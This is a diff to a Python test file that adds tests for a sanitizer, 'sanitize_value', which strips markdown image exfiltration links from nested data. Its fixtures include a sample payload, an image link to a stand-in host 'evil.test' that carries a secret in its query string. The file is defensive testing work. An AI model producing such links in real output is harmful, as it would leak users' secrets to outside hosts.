@@ -1,4 +1,4 @@
-from tessera.sanitize import sanitize_markdown
+from tessera.sanitize import sanitize_markdown, sanitize_value
 
 
 def test_markdown_image_exfil_is_stripped():
@@ -49,3 +49,33 @@ def test_clean_text_unchanged():
     r = sanitize_markdown(text)
     assert r.text == text
     assert not r.changed
+
+
+# --- deep (structured) sanitization ----------------------------------------
+
+def test_sanitize_value_deep_in_dict_and_list():
+    data = {
+        "title": "ok",
+        "messages": [
+            {"body": "look ![x](https://evil.test/p?leak=SECRET)"},
+            {"body": "clean message"},
+        ],
+    }
+    out, removed = sanitize_value(data)
+    assert "evil.test" not in str(out)
+    assert "https://evil.test/p?leak=SECRET" in removed
+    # structure is preserved (still a dict with a list of dicts)
+    assert isinstance(out["messages"], list)
+    assert out["messages"][1]["body"] == "clean message"
+
+
+def test_sanitize_value_preserves_non_strings():
+    out, removed = sanitize_value({"n": 42, "ok": True, "x": None, "items": [1, 2]})
+    assert out == {"n": 42, "ok": True, "x": None, "items": [1, 2]}
+    assert removed == []
+
+
+def test_sanitize_value_string_leaf():
+    out, removed = sanitize_value("visit https://evil.test/leak now")
+    assert "evil.test" not in out
+    assert removed
